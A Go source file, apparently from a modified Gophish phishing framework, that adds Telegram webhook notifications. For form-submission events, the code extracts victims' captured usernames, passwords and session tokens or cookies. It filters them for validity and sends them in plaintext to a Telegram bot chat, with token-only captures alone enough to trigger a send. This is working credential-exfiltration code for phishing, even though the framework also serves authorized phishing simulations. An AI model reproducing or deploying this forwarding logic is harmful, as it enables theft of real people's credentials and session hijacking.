package models

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"

	log "github.com/gophish/gophish/logger"
	"github.com/gophish/gophish/webhook"
)

// Webhook interface types
const (
	WebhookTypeStandard = "standard"
	WebhookTypeTelegram = "telegram"
)

// telegramMaxMessageLen is the hard character limit imposed by the Telegram
// Bot API for the sendMessage text field.
const telegramMaxMessageLen = 4096

// Webhook represents the webhook model
type Webhook struct {
	Id     int64  `json:"id" gorm:"column:id; primary_key:yes"`
	Name   string `json:"name"`
	Type   string `json:"type" gorm:"column:type"`
	URL    string `json:"url"`
	Secret string `json:"secret"`
	// Telegram-specific fields, only used when Type is WebhookTypeTelegram
	TelegramBotToken string `json:"telegram_bot_token" gorm:"column:telegram_bot_token"`
	TelegramChatID   string `json:"telegram_chat_id" gorm:"column:telegram_chat_id"`
	// For Submitted Data events, whether to include the captured username,
	// password and tokens/cookies values in the Telegram message.
	TelegramIncludeUsername bool `json:"telegram_include_username" gorm:"column:telegram_include_username"`
	TelegramIncludePassword bool `json:"telegram_include_password" gorm:"column:telegram_include_password"`
	TelegramIncludeTokens   bool `json:"telegram_include_tokens" gorm:"column:telegram_include_tokens"`
	// Validation filters for Telegram Submitted Data notifications.
	// TelegramUsernamePattern is a regex that the captured username must match
	// to be included. Empty means all usernames are accepted.
	TelegramUsernamePattern string `json:"telegram_username_pattern" gorm:"column:telegram_username_pattern"`
	// TelegramMinPasswordLength is the minimum character length a password
	// must have to be included. 0 means no minimum.
	TelegramMinPasswordLength int `json:"telegram_min_password_length" gorm:"column:telegram_min_password_length"`
	// TelegramMinTokenLength is the minimum character length a token/cookie
	// blob must have to be included. 0 means no minimum.
	TelegramMinTokenLength int `json:"telegram_min_token_length" gorm:"column:telegram_min_token_length"`
	// Events is a comma-separated list of event keys this webhook is notified
	// for (sent, opened, clicked, submitted, reported). An empty value means
	// all events are sent (backwards compatible with older webhooks).
	Events   string `json:"events" gorm:"column:events"`
	IsActive bool   `json:"is_active"`
}

// ErrURLNotSpecified indicates there was no URL specified
var ErrURLNotSpecified = errors.New("URL can't be empty")

// ErrNameNotSpecified indicates there was no name specified
var ErrNameNotSpecified = errors.New("Name can't be empty")

// ErrTelegramBotTokenNotSpecified indicates a Telegram webhook has no bot token
var ErrTelegramBotTokenNotSpecified = errors.New("Telegram bot token can't be empty")

// ErrTelegramChatIDNotSpecified indicates a Telegram webhook has no chat ID
var ErrTelegramChatIDNotSpecified = errors.New("Telegram chat ID can't be empty")

// webhookEventKeys maps event messages to the short keys used in the Events
// filter field.
var webhookEventKeys = map[string]string{
	EventSent:       "sent",
	EventOpened:     "opened",
	EventClicked:    "clicked",
	EventDataSubmit: "submitted",
	EventReported:   "reported",
}

// GetWebhooks returns the webhooks
func GetWebhooks() ([]Webhook, error) {
	whs := []Webhook{}
	err := db.Find(&whs).Error
	return whs, err
}

// GetActiveWebhooks returns the active webhooks
func GetActiveWebhooks() ([]Webhook, error) {
	whs := []Webhook{}
	err := db.Where("is_active=?", true).Find(&whs).Error
	return whs, err
}

// GetWebhook returns the webhook that the given id corresponds to.
// If no webhook is found, an error is returned.
func GetWebhook(id int64) (Webhook, error) {
	wh := Webhook{}
	err := db.Where("id=?", id).First(&wh).Error
	return wh, err
}

// PostWebhook creates a new webhook in the database.
func PostWebhook(wh *Webhook) error {
	err := wh.Validate()
	if err != nil {
		log.Error(err)
		return err
	}
	err = db.Save(wh).Error
	if err != nil {
		log.Error(err)
	}
	return err
}

// PutWebhook edits an existing webhook in the database.
func PutWebhook(wh *Webhook) error {
	err := wh.Validate()
	if err != nil {
		log.Error(err)
		return err
	}
	err = db.Save(wh).Error
	return err
}

// DeleteWebhook deletes an existing webhook in the database.
// An error is returned if a webhook with the given id isn't found.
func DeleteWebhook(id int64) error {
	err := db.Where("id=?", id).Delete(&Webhook{}).Error
	return err
}

func (wh *Webhook) Validate() error {
	if wh.Name == "" {
		return ErrNameNotSpecified
	}
	if wh.Type == WebhookTypeTelegram {
		if wh.TelegramBotToken == "" {
			return ErrTelegramBotTokenNotSpecified
		}
		if wh.TelegramChatID == "" {
			return ErrTelegramChatIDNotSpecified
		}
		return nil
	}
	if wh.URL == "" {
		return ErrURLNotSpecified
	}
	return nil
}

// HandlesEvent reports whether this webhook should be notified for the given
// event message. An empty Events filter means all events are sent (backwards
// compatible with webhooks created before event filtering existed).
func (wh *Webhook) HandlesEvent(message string) bool {
	if strings.TrimSpace(wh.Events) == "" {
		return true
	}
	key, ok := webhookEventKeys[message]
	if !ok {
		return false
	}
	for _, ev := range strings.Split(wh.Events, ",") {
		if strings.TrimSpace(ev) == key {
			return true
		}
	}
	return false
}

// Notify sends the given event to the webhook, formatting it according to the
// webhook's type (standard JSON+HMAC, or a Telegram message).
func (wh *Webhook) Notify(e *Event) {
	if wh.Type == WebhookTypeTelegram {
		msg := wh.formatTelegramMessage(e)
		if msg == "" {
			return // nothing meaningful to send (e.g. no valid credentials/tokens)
		}
		if err := webhook.SendTelegram(wh.TelegramBotToken, wh.TelegramChatID, msg); err != nil {
			log.Errorf("error sending telegram webhook: %v", err)
		}
		return
	}
	if err := webhook.Send(webhook.EndPoint{URL: wh.URL, Secret: wh.Secret}, e); err != nil {
		log.Errorf("error sending webhook: %v", err)
	}
}

// formatTelegramMessage builds a human-readable Telegram notification for an
// event. For Submitted Data events the behaviour depends on the webhook's
// credential/token toggles and validation filters:
//
//   - Username is included if the toggle is on AND the value matches the
//     configured regex pattern (empty pattern = accept all).
//   - Password is included if the toggle is on AND its length meets the
//     configured minimum (0 = no minimum).
//   - Tokens/cookies are included if the toggle is on AND the blob length
//     meets the configured minimum. If tokens were captured but the toggle
//     is off, a note is added instead: "🍪 Tokens captured (not shown)".
//   - A notification is sent when valid credentials (username+password) OR
//     valid tokens are present. If nothing passes validation the method
//     returns an empty string, and Notify skips the send.
//
// The time is rendered in the host machine's local timezone.
func (wh *Webhook) formatTelegramMessage(e *Event) string {
	emoji := "🎣"
	switch e.Message {
	case EventSent:
		emoji = "📧"
	case EventOpened:
		emoji = "📨"
	case EventClicked:
		emoji = "🖱️"
	case EventDataSubmit:
		emoji = "🔑"
	case EventReported:
		emoji = "📢"
	}
	lines := []string{fmt.Sprintf("%s Gophish: %s", emoji, e.Message)}
	if e.Email != "" {
		lines = append(lines, "Target: "+e.Email)
	}
	lines = append(lines, fmt.Sprintf("Campaign ID: %d", e.CampaignId))

	hasCredentials := false
	hasTokens := false

	if e.Message == EventDataSubmit {
		payload := payloadFromEvent(e)

		// --- Collect and validate before appending anything ---
		usernameValid := false
		usernameValue := ""
		if wh.TelegramIncludeUsername {
			usernameValue = findPayloadValue(payload, []string{"user", "email", "login"})
			if usernameValue != "" && wh.matchUsernamePattern(usernameValue) {
				usernameValid = true
			}
		}

		passwordValid := false
		passwordValue := ""
		if wh.TelegramIncludePassword {
			passwordValue = findPayloadValue(payload, []string{"pass"})
			if passwordValue != "" && len(passwordValue) >= wh.TelegramMinPasswordLength {
				passwordValid = true
			}
		}

		// Credentials are valid only when BOTH username AND password pass
		// validation, regardless of which toggles are on. If a toggle is off,
		// that field is considered "not checked" and thus not valid — so
		// credentials cannot be satisfied with only one field.
		if wh.TelegramIncludeUsername && wh.TelegramIncludePassword {
			hasCredentials = usernameValid && passwordValid
		}
		// If only one toggle is on, the other is missing → hasCredentials stays false.

		tokensValue := findPayloadValue(payload, []string{"token", "cookie", "session"})
		if tokensValue != "" && len(tokensValue) >= wh.TelegramMinTokenLength {
			hasTokens = true
		}

		// Send when valid credentials (username+password) are present, OR when
		// tokens pass the minimum-length filter (token-only captures are valid).
		if !hasCredentials && !hasTokens {
			return ""
		}

		// Now append the validated lines.
		if usernameValid {
			lines = append(lines, "Username: "+usernameValue)
		}
		if passwordValid {
			lines = append(lines, "Password: "+passwordValue)
		}
		if hasTokens {
			if wh.TelegramIncludeTokens {
				const (
					tokenPrefix = "Tokens: "
					truncSuffix = "… (truncated)"
					// Conservative upper bound for "\nTime: YYYY-MM-DD HH:MM:SS ZZZZ"
					tsLineMax = 40
				)
				// baseLen is everything assembled so far joined with newlines.
				// The token line adds: "\n" + prefix + value; timestamp adds tsLineMax.
				baseLen := len(strings.Join(lines, "\n"))
				budget := telegramMaxMessageLen - baseLen - 1 - len(tokenPrefix) - tsLineMax
				if budget <= 0 {
					lines = append(lines, fmt.Sprintf("🍪 Tokens captured (too long to display, %d chars)", len(tokensValue)))
				} else if len(tokensValue) > budget {
					cut := budget - len(truncSuffix)
					if cut < 0 {
						cut = 0
					}
					lines = append(lines, tokenPrefix+tokensValue[:cut]+truncSuffix)
				} else {
					lines = append(lines, tokenPrefix+tokensValue)
				}
			} else {
				lines = append(lines, fmt.Sprintf("🍪 Tokens captured (not shown, %d chars)", len(tokensValue)))
			}
		}
	}

	// Use the host machine's local system time for the timestamp.
	lines = append(lines, "Time: "+e.Time.Local().Format("2006-01-02 15:04:05 MST"))
	return strings.Join(lines, "\n")
}

// matchUsernamePattern checks whether the given username matches the configured
// regex pattern. An empty pattern accepts everything.
func (wh *Webhook) matchUsernamePattern(username string) bool {
	if wh.TelegramUsernamePattern == "" {
		return true
	}
	re, err := regexp.Compile(wh.TelegramUsernamePattern)
	if err != nil {
		log.Errorf("invalid telegram username regex %q: %v", wh.TelegramUsernamePattern, err)
		return true // fail open — don't silently drop notifications
	}
	return re.MatchString(username)
}

// payloadFromEvent parses the submitted form values out of an event's details.
func payloadFromEvent(e *Event) url.Values {
	if e.Details == "" {
		return url.Values{}
	}
	var d EventDetails
	if err := json.Unmarshal([]byte(e.Details), &d); err != nil {
		log.Errorf("error parsing event details for telegram message: %v", err)
		return url.Values{}
	}
	if d.Payload == nil {
		return url.Values{}
	}
	return d.Payload
}

// findPayloadValue returns the value of the first payload field (in sorted key
// order, for determinism) whose key contains any of the given needles. Internal
// fields such as rid are ignored.
func findPayloadValue(payload url.Values, needles []string) string {
	keys := make([]string, 0, len(payload))
	for k := range payload {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		if k == "rid" || k == "__original_url" {
			continue
		}
		lower := strings.ToLower(k)
		for _, n := range needles {
			if strings.Contains(lower, n) {
				return strings.Join(payload[k], ", ")
			}
		}
	}
	return ""
}
